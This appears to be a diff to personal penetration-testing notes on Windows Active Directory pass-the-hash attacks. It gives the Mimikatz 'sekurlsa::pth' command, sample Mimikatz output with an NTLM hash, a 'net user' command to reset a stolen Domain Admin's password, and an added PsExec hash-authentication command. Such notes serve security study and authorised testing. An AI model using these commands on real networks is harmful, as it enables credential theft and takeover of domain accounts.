@@ -372,7 +372,7 @@ Primary:WDigest *
 ## Pass-the-Hash with Mimikatz
 * With your NTLM hash, you can use the `sekurlsa::pth` command in Mimikatz to spawn a new process with the provided username and hash, and the process will open with the user's privileges. So, if you've stolen a Domain Admin hash, you'll now be able to open processes as the Domain Admin. To do this, use the following Mimikatz command with the stolen hash. You'll need to provide the compromised user's username, the domain name, and the NTLM hash:
   * This command will then spawn a new process (by default, cmd.exe), with the privileges of the provided user.
-  * With these new privileges, there are likely numerous ways to access the DC. One simple way is to change the plaintext password of the user whose NTLM password hash you've stolen to something of yoour choice. For example, you can change their password by running the following command: `net user Example-Admin password123! /domain`. 
+  * With these new privileges, there are likely numerous ways to access the DC. One simple way is to change the plaintext password of the user whose NTLM password hash you've stolen to something of your choice. For example, you can change their password by running the following command: `net user Example-Admin password123! /domain`. Once you've done that, you can use those credentials to connect to the DC> 
 ```
 sekurlsa::pth /user:<username> /domain:<Domain> /ntlm:<NTLM Hash>
 ---
@@ -398,5 +398,8 @@ NTLM    : 9BFEA4F8177A11F06B37957A55B13F70
   \_ *Password replace @ 000002105D3058F8 (32) -> null
 
 ```
-
+## PsExec
+* The PsExec tool is part of the SysInternals Suite that allows users to launch an interactive command prompt on a remote system, execute processes, and redirect the output to the local system. However, you can exploit PsExec's features and functionalities for a pass-the-hash attack.
+* Once you have a username and their NTLM hash, you can use PsExec to authenticate to a remote machine without the plaintext password. The syntax for this command would look something like `./psexec.py -hashes :<NTLM hash> <Domain>/<Username>@<Target IP>`
+* 
 
